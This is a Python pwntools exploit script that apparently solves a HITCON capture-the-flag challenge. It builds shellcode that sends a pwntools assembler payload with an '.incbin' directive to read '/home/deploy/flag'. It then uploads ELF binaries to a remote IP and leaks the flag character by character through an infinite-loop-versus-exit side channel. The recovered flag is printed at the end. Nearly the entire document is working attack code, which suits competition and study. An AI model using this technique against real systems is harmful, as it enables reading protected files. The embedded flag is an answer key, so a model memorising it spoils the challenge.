from pwn import *

context.arch = 'amd64'
context.os = 'linux'

payload  = """0
#define syscall .incbin "/home/deploy/flag\"
""" + '@'

offset = asm(shellcraft.stager(payload[:-1].replace('/home/deploy/flag', './yeet'), 0x4000)).find('yeet')
print(offset)

flag = 'hitcon{use_pwntools_to_pwn_pwntools'

while flag[-1] != '}':
    lo, hi = 0x20, 0x7f
    while lo != hi:
        mid = (lo + hi) // 2

        code  = ''
        code += 'sub rsp, 0x100\n'
        code += shellcraft.pushstr('stack address @ 0x0\n', append_null=False)
        code += shellcraft.write(1, 'rsp', len('stack address @ 0x0\n'))
        code += 'push 0\npush 1\n'
        code += shellcraft.nanosleep('rsp', 0)
        code += shellcraft.connect('127.0.0.1', 31337)  # connected socket @ rbp
        code += shellcraft.pushstr(payload, append_null=False)
        code += shellcraft.write('rbp', 'rsp', len(payload))
        code += shellcraft.read('rbp', 'rsp', 100)
        code += 'cmpb [rsp + {}], {}\n'.format(offset + len(flag), mid)
        code += 'jbe $+4\n'
        code += shellcraft.infloop()  # flag[i] > mid (infloop, "Pwned!")
        code += shellcraft.exit(0)    # flag[i] <= mid ("EOFError")

        binary = make_elf(asm(code))

        p = remote('3.115.58.219', 9427)
        p.sendlineafter(')\n', str(len(binary)))
        p.send(binary)

        try:
            p.recvuntil('EOFError')
            hi = mid
        except EOFError:
            lo = mid + 1
        
        print(lo, hi)

        p.close()
    
    assert lo == hi
    flag += chr(lo)
    print(flag)

### hitcon{use_pwntools_to_pwn_pwntools_^ovo^} ###